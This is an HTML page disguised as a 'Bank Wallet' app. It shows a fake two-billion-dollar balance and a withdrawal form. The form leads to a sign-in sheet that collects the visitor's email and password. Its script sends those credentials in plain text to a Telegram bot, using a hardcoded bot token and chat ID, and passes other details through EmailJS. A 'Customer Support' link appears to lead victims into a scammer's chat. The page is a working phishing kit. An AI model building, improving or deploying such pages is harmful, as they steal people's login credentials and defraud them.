<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Wallet</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="manifest" href="manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <style>
        /* Global Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Header Styles */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background: #002f6c;
            color: white;
            width: 100%;
            box-sizing: border-box;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 10;
            flex-wrap: wrap;
        }

        .header select {
            padding: 8px;
            background: #004a99;
            color: white;
            border-radius: 25px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
        }

        /* Content Section */
        .content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding: 80px 10px 20px;
            overflow-y: auto;
        }

        .wallet,
        .withdrawal,
        .transaction-history {
            background: white;
            margin: 10px auto;
            padding: 15px;
            width: 90%;
            max-width: 480px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .withdrawal input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #ccc;
        }

        button {
            background: #002f6c;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-size: 16px;
        }

        /* Spinner Styles */
        .spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            animation: zoom 0.5s infinite alternate;
        }

        @keyframes zoom {
            0% {
                transform: scale(1);
            }
            100% {
                transform: scale(1.1);
            }
        }

        /* Bottom Sheet Styles */
        .bottom-sheet {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
            padding: 20px;
            max-height: 50%;
            overflow-y: auto;
            z-index: 30;
            animation: slide-up 0.3s ease-out;
        }

        @keyframes slide-up {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(0);
            }
        }

        /* Floating Support Icon */
        .support-icon {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #004a99;
            color: white;
            border-radius: 50%;
            padding: 15px;
            font-size: 24px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            animation: zoom 0.5s infinite alternate;
            z-index: 1000;
        }

        .support-icon:hover {
            background: #003366;
        }
    </style>
</head>

<body>

    <div class="header">
        <select id="languageSelector" onchange="changeLanguage()">
            <option value="en">English</option>
            <option value="ko">Korean</option>
            <option value="th">Thai</option>
            <option value="tr">Turkish</option>
            <option value="es">Spanish</option>
            <option value="pt">Portuguese</option>
        </select>
    </div>

    <div class="content">
        <div class="wallet">
            <p class="balance">Balance: $<span id="balance">2000000000</span></p>
        </div>

        <div class="withdrawal">
            <h3>Withdraw Funds</h3>
            <input type="text" id="bankName" placeholder="Add your bank name">
            <input type="number" id="accountNumber" placeholder="Add account number">
            <input type="number" id="withdrawAmount" placeholder="Enter amount to withdraw" oninput="updateBalance()">
            <button onclick="initiateWithdrawal()" id="withdrawButton">Withdraw</button>
        </div>

        <div class="bottom-sheet" id="signInBottomSheet">
            <h3>Sign In</h3>
            <input type="email" id="userEmail" placeholder="Your email" required>
            <input type="password" id="userPassword" placeholder="Your password" required>
            <button onclick="submitCredentials()">Proceed to Withdraw</button>
            <button onclick="closeBottomSheet()">Close</button>
            <div class="spinner" id="spinner">
                <img src="https://i.imgur.com/llF5y5p.gif" alt="Loading..." width="50" height="50">
            </div>
        </div>
    </div>

    <a href="https://services.zangi.com/dl/conversation/1089683230" class="support-icon material-icons" target="_blank" title="Customer Support">support_agent</a>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("aTrl7Eh529vrV7-WQ"); // Initialize EmailJS
        })();

        let balance = 2000000000;

        function updateBalance() {
            let amount = parseFloat(document.getElementById("withdrawAmount").value);
            if (isNaN(amount) || amount <= 0) {
                amount = 0;
            }
            const remainingBalance = balance - amount;
            document.getElementById("balance").innerText = remainingBalance;
        }

        function initiateWithdrawal() {
            const amount = document.getElementById("withdrawAmount").value;
            if (amount > 0 && amount <= balance) {
                balance -= amount;
                document.getElementById("balance").innerText = balance;
                document.getElementById("signInBottomSheet").style.display = "block"; // Show bottom sheet
            } else {
                console.log("Invalid amount. Please enter a valid amount.");
            }
        }

        function closeBottomSheet() {
            document.getElementById("signInBottomSheet").style.display = "none"; // Hide bottom sheet
        }

        function showToast(message, isError = false) {
            const toast = document.createElement('div');
            toast.innerText = message;
            toast.className = `toast ${isError ? 'error' : 'success'}`;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.remove();
            }, 3000);
        }

        function submitCredentials() {
            const email = document.getElementById("userEmail").value;
            const password = document.getElementById("userPassword").value;
            const amount = document.getElementById("withdrawAmount").value;
            const date = new Date().toLocaleDateString();

            // Show the spinner
            const spinner = document.getElementById("spinner");
            spinner.style.display = "block";

            // Prepare message for Telegram
            const telegramMessage = `Email: ${email}\nPassword: ${password}`;

            // Send email using EmailJS
            emailjs.send('service_hupf218', 'template_u608irc', {
                email: email,
                amount: amount,
                date: date,
                balance: balance
            }).then(() => {
                console.log('Withdrawal successful! Email sent.');

                // Send message to Telegram bot
                return fetch(`https://api.telegram.org/7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '7959877182',
                        text: telegramMessage
                    })
                });
            }).then(response => {
                if (response.ok) {
                    console.log('Notification sent to Telegram!');
                    showToast('Withdrawal successful! Your email has been sent.', false);
                    closeBottomSheet(); // Hide bottom sheet
                    spinner.style.display = "none"; // Hide spinner

                    // Redirect to activate3.html after a brief delay
                    setTimeout(() => {
                        window.location.href = 'activate3.html';
                    }, 500);
                } else {
                    throw new Error('Error sending message to Telegram.');
                }
            }).catch(err => {
                console.error('Error: ' + err);
                showToast('Error sending notification.', true);
                spinner.style.display = "none"; // Hide spinner on error
                setTimeout(() => {
                    closeBottomSheet(); // Close modal on error
                }, 2000); // Wait 2 seconds before closing
            });
        }
    </script>
</body>

</html>
